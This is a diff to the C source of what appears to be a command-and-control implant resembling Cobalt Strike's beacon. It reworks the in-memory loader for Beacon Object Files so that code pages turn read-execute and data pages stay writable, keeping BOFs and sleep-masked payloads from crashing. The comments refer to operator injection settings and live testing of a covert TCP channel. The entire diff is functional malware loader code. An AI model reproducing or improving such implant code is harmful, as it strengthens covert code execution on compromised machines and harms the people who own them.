@@ -468,8 +468,9 @@ static char * bof_alloc(SIZE_T total, int * how) {
 		char * p;
 		if (map == NULL)
 			return NULL;
-		/* map RW-only: the view becomes executable via finalize_memory_permissions
-		 * before the BOF runs - no need to hold FILE_MAP_EXECUTE (RWX) up front */
+		/* map RW-only: the code region flips to RX via the permission
+		 * split in command_inline_execute_object_parsed before the BOF
+		 * runs - no need to hold FILE_MAP_EXECUTE (RWX) up front */
 		p = (char *)MapViewOfFile(map, FILE_MAP_ALL_ACCESS, 0, 0, total);
 		CloseHandle(map);
 		return p;
@@ -601,6 +602,7 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 	char * pdata_dst;
 	char * bss_dst;
 	SIZE_T total;
+	SIZE_T off_rdata, off_data, off_xdata, off_pdata, off_bss;
 	OBJ_RELOC * reloc;
 	BOOL success = FALSE;
 #if defined(_M_X64) && defined(BOFWIN_ENABLE)
@@ -625,7 +627,16 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 	pdata = data_extract(&parser);
 	relocs = data_extract(&parser);
 
-	total = (SIZE_T)code.length + rdata.length + data.length + xdata.length + pdata.length + bssSize;
+	/* section layout: .data (and .bss) start on their own page so the
+	 * permission split below never leaves any page RWX. Code and rdata
+	 * stay contiguous; xdata/pdata ride behind .data inside the writable
+	 * run (they only need read). */
+	off_rdata = (SIZE_T)code.length;
+	off_data  = (off_rdata + (SIZE_T)rdata.length + 0xFFF) & ~(SIZE_T)0xFFF;
+	off_xdata = off_data + (SIZE_T)data.length;
+	off_pdata = off_xdata + (SIZE_T)xdata.length;
+	off_bss   = (off_pdata + (SIZE_T)pdata.length + 0xFFF) & ~(SIZE_T)0xFFF;
+	total     = off_bss + (SIZE_T)bssSize;
 	if (total == 0) {
 		free(ftable);
 		return FALSE;
@@ -664,12 +675,12 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 		bof_cached_how = how;
 	}
 
-	code_dst = base;
-	rdata_dst = code_dst + code.length;
-	data_dst = rdata_dst + rdata.length;
-	xdata_dst = data_dst + data.length;
-	pdata_dst = xdata_dst + xdata.length;
-	bss_dst = pdata_dst + pdata.length;
+	code_dst  = base;
+	rdata_dst = base + off_rdata;
+	data_dst  = base + off_data;
+	xdata_dst = base + off_xdata;
+	pdata_dst = base + off_pdata;
+	bss_dst   = base + off_bss;
 
 	if (code.buffer) memcpy(code_dst, code.buffer, code.length);
 	if (rdata.buffer) memcpy(rdata_dst, rdata.buffer, rdata.length);
@@ -755,20 +766,31 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 		if (pdata.buffer) memcpy(pdata_dst, pdata.buffer, pdata.length);
 		if (code.buffer)
 			memset(code.buffer, 0, code.length);
-		inlinefunc = (void(*)(char * buffer, int length))(code_dst + entry);
-		/* finalize_memory_permissions short-circuits when the two PERMS
-		 * settings are equal (unconfigured profile: 0 == 0), leaving the BOF
-		 * memory plain RW - the mapping view is created without
-		 * FILE_MAP_EXECUTE and allocator 0 VirtualAllocs RW. Executing there
-		 * DEP-faults the process inside the masked window (observed live:
-		 * every sleep_mask-true payload died in its first masked sleep).
-		 * Flip to RX ourselves when finalize would skip; the reuse tail
-		 * flips the page back to RW after the run. */
-		if (setting_short(SETTING_PROCINJ_PERMS_I) == setting_short(SETTING_PROCINJ_PERMS)) {
-			DWORD oldx = 0;
-			VirtualProtect(base, total, PAGE_EXECUTE_READ, &oldx);
-		}
-		if (finalize_memory_permissions(base, total)) {
+	inlinefunc = (void(*)(char * buffer, int length))(code_dst + entry);
+	/* BOF permission split (2026-10-17 udc2 live battle): the old code
+	 * flattened the whole allocation to one protection - RX in the
+	 * unconfigured case, the operator's settle perm otherwise - so every
+	 * BOF .data/.bss write faulted (udc2_tcp's store to its g_sock
+	 * static AV'd silently mid-go; handing a .data buffer to the kernel
+	 * came back WSAEFAULT 10014). Layout now pads .data/.bss onto fresh
+	 * pages: [base, data_dst) takes the operator's settle permission,
+	 * defaulting to RX when the profile leaves the two PERMS equal
+	 * (executing in the plain RW mapping DEP-faults - observed live with
+	 * every sleep_mask-true payload), and [data_dst, base+total) stays
+	 * writable. No page is ever RWX; the reuse tail still idles the
+	 * whole block RW after the run. */
+	{
+		DWORD oldp = 0;
+		DWORD codeperm = (DWORD)setting_short(SETTING_PROCINJ_PERMS);
+		BOOL perms_ok;
+		if (codeperm == 0 || codeperm == (DWORD)setting_short(SETTING_PROCINJ_PERMS_I))
+			codeperm = PAGE_EXECUTE_READ;
+		perms_ok = VirtualProtect(base, (SIZE_T)(data_dst - base), codeperm, &oldp);
+		if (perms_ok && (SIZE_T)(base + total - data_dst) > 0)
+			perms_ok = VirtualProtect(data_dst, (SIZE_T)(base + total - data_dst), PAGE_READWRITE, &oldp);
+		if (!perms_ok)
+			post_error_d(0x11, (int)GetLastError());
+		if (perms_ok) {
 			if (conv == 1) {
 				DWORD t = 0;
 				BEACON_INFO info;
